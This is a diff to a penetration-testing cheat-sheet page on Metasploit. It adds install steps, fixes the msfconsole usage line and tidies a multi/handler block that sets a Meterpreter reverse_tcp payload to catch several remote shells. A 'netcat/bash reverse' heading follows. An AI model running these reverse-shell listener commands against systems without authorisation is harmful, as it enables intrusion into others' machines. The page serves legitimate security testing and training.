@@ -8,7 +8,7 @@ title : "Metasploit"
 ### The title of the page in menu will be postfixed by this HTML content
 # post : ""
 ### The description for the content.
-description : "Metasploit description."
+description : "The world’s most used penetration testing framework"
 ### The datetime assigned to this page.
 date : 2020-03-10T16:33:38+01:00
 ### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
@@ -42,14 +42,22 @@ cascade:
 
 ### Install
 
+Easiest way is to use Kali/Parrot and install from repo
+
+```bash
+apt install metasploit-framework
 ```
+
+otherwise download from 
+
+```bash
 https://github.com/rapid7/metasploit-framework/releases
 ```
 
 ### Usage
 
 ```bash
-msfconsole [options]]
+msfconsole [options]
 ```
 
 ### Flags
@@ -118,16 +126,15 @@ run"
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
 
 ```bash
-use exploit/multi/handler  
-set payload windows/meterpreter/reverse_tcp  
-set lhost <IP>  
-set lport <PORT>  
-set ExitOnSession false  
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost <IP>
+set lport <PORT>
+set ExitOnSession false
 exploit -j
 ```
 
 The -j option is to keep all the connected session in the background.  
-
 
 ##### netcat/bash reverse
 
